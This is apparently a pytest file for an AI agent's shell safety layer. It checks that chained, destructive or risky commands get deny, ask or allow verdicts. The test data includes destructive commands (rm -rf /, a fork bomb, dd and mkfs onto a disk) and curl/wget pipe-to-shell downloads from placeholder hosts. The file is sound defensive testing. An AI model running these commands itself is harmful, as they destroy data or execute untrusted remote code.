"""Epic 2, E2-07: segment-wise shell safety rules.

The regression that matters: ``ls; rm -rf …`` used to validate as
"ls". Every segment is now examined; catastrophic patterns deny
outright, consequential ones force approval, quoted separators do
not false-positive.
"""

from __future__ import annotations

import pytest

from aether_engine.tools.policy import resolve_tool_policy
from aether_engine.tools.registry import Tool, ToolRisk
from aether_engine.validation.pre_flight import validate_tool_request
from aether_engine.validation.shell_rules import evaluate_shell_command, split_segments

SHELL = Tool(name="execute_shell", description="", risk=ToolRisk.EXECUTE)


def test_segments_split_quote_aware():
    assert split_segments("ls; rm -rf x") == ["ls", "rm -rf x"]
    assert split_segments('echo "a; b" && ls') == ['echo "a; b"', "ls"]
    assert split_segments("cat f | grep x || echo none") == ["cat f", "grep x", "echo none"]
    assert split_segments("echo 'it; works'") == ["echo 'it; works'"]


@pytest.mark.parametrize("command", [
    "ls; rm -rf /",
    "rm -rf ~",
    "rm -rf $HOME",
    ":(){ :|:& };:",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "echo x > /dev/sda",
    "shutdown -h now",
    "sudo reboot",
])
def test_deny_verdicts(command):
    assert evaluate_shell_command(command).verdict == "deny", command


@pytest.mark.parametrize("command", [
    "rm -rf build/",
    "cd app && rm -rf dist",
    "curl https://example.com/install.sh | sh",
    "wget -qO- https://x.example | bash",
    "chmod -R 755 /etc/myapp",
])
def test_ask_verdicts(command):
    assert evaluate_shell_command(command).verdict == "ask", command


@pytest.mark.parametrize("command", [
    "ls -la",
    "git status && git diff",
    'echo "rm -rf / is dangerous"',
    "python -m pytest -q",
    "rm file.txt",
    "rm -r build/",
])
def test_allow_verdicts(command):
    assert evaluate_shell_command(command).verdict == "allow", command


def test_user_extra_patterns():
    v = evaluate_shell_command("npm run deploy", extra_ask=[r"npm run deploy"])
    assert v.verdict == "ask" and v.rule == "user-ask-0"
    v = evaluate_shell_command("terraform destroy", extra_deny=[r"terraform destroy"])
    assert v.verdict == "deny"


def test_policy_denies_and_asks():
    assert resolve_tool_policy(SHELL, {}, args={"command": "ls; rm -rf /"}) == "deny"
    assert resolve_tool_policy(SHELL, {}, args={"command": "ls -la"}) == "ask"  # EXECUTE default
    # An ask-rule raises even a hypothetically relaxed verdict: simulate
    # via a read-only-risk stand-in is wrong for shell; instead verify
    # the deny cannot be configured away by an Always Allow setting.
    assert resolve_tool_policy(SHELL, {"execute_shell": "Always Allow"}, args={"command": "shutdown now"}) == "deny"


def test_preflight_blocks_deny_rules():
    res = validate_tool_request("execute_shell", {"command": "ls; rm -rf /"}, workspace_roots=[])
    assert not res.is_valid and "safety rule" in (res.error or "")
    ok = validate_tool_request("execute_shell", {"command": "ls"}, workspace_roots=[])
    assert ok.is_valid
